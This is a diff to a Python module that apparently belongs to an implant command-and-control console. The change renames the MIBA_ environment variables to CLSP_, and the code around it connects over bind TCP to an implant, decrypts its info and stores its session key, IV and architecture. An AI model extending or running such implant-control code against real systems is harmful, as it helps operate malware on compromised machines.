@@ -14,7 +14,7 @@ def read_rsa_pkey(key_path):
     eh.ui.Echo(f"Key '{key_path}' not exists in keystorage", eh.ECHO_ERROR)
 
 def main(args):
-    if(not args.relock and eh.ui.GetEnv("MIBA_CONNECTION") != ""):
+    if(not args.relock and eh.ui.GetEnv("CLSP_CONNECTION") != ""):
         eh.ui.Echo("The session is already set up", eh.ECHO_ERROR)
         return
     tcp_connection = eh.net.NewConnection(args.host, args.port, eh.TCP_CONNECTION)
@@ -54,23 +54,23 @@ def main(args):
     implant_info.from_bytes(decrypted_implant_info)
 
     eh.ui.Echo("Implant version: " + bytes(implant_info.implant_version)[::-1].hex(), eh.ECHO_DEFAULT)
-    eh.ui.SetEnv("MIBA_VERSION", bytes(implant_info.implant_version)[::-1].hex())
+    eh.ui.SetEnv("CLSP_VERSION", bytes(implant_info.implant_version)[::-1].hex())
 
     eh.ui.Echo("Implant id: " +  str(int(implant_info.implant_id)), eh.ECHO_DEFAULT)
-    eh.ui.SetEnv("MIBA_ID", str(int(implant_info.implant_id)))
+    eh.ui.SetEnv("CLSP_ID", str(int(implant_info.implant_id)))
   
     eh.ui.Echo("Implant session key: " + bytes(implant_info.session_key).hex(), eh.ECHO_DEFAULT)
-    eh.ui.SetEnv("MIBA_KEY", bytes(implant_info.session_key).hex())
+    eh.ui.SetEnv("CLSP_KEY", bytes(implant_info.session_key).hex())
 
     eh.ui.Echo("IV key: " + bytes(hello_response.next_iv).hex(), eh.ECHO_DEFAULT)
-    eh.ui.SetEnv("MIBA_IV", bytes(hello_response.next_iv).hex())
+    eh.ui.SetEnv("CLSP_IV", bytes(hello_response.next_iv).hex())
 
     if(int.from_bytes(implant_info.implant_arch.get(), "little") == const.X64_ARCH):
         eh.ui.Echo("Implant architecture: X64", eh.ECHO_DEFAULT)
-        eh.ui.SetEnv("MIBA_ARCH", "X64")
+        eh.ui.SetEnv("CLSP_ARCH", "X64")
     else:
         eh.ui.Echo("Implant architecture: X32", eh.ECHO_DEFAULT)
-        eh.ui.SetEnv("MIBA_ARCH", "X32")
+        eh.ui.SetEnv("CLSP_ARCH", "X32")
         
     if(int.from_bytes(implant_info.platform_arch.get(), "little") == const.X64_ARCH):
         eh.ui.Echo("Platform architecture: X64", eh.ECHO_DEFAULT)
@@ -98,23 +98,23 @@ def main(args):
     if eh.ui.GetLockedModule() != "":
         eh.ui.UnlockModule()
     eh.ui.LockModule("clsp")
-    eh.ui.SetEnv("MIBA_CONNECTION", tcp_connection)
-    eh.ui.SetEnv("MIBA_CONNECTION_TYPE", "bind_tcp")
+    eh.ui.SetEnv("CLSP_CONNECTION", tcp_connection)
+    eh.ui.SetEnv("CLSP_CONNECTION_TYPE", "bind_tcp")
     
     if args.nosurvey:
-        eh.ui.SetEnv("MIBA_SURVEY_RUN", "false")
+        eh.ui.SetEnv("CLSP_SURVEY_RUN", "false")
     else:
-        eh.ui.SetEnv("MIBA_SURVEY_RUN", "true")
+        eh.ui.SetEnv("CLSP_SURVEY_RUN", "true")
 
     if args.survey_rescan == None:
-        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'ask')
+        eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'ask')
     elif args.survey_rescan.lower() == 'yes':
-        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'true')
+        eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
     elif args.survey_rescan.lower() == 'no':
-        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'false')
+        eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'false')
     else:
         eh.ui.Echo(f"Unkown argument '-survey_rescan' value '{args.survey_rescan}', switching to 'yes'", eh.ECHO_WARNING)
-        eh.ui.SetEnv("MIBA_SURVEY_RESCAN_TARGET", 'true')
+        eh.ui.SetEnv("CLSP_SURVEY_RESCAN_TARGET", 'true')
     __on_ready_callback.ClingyspiderDefaultCallback(eh.CONSOLE_ID)
 
 
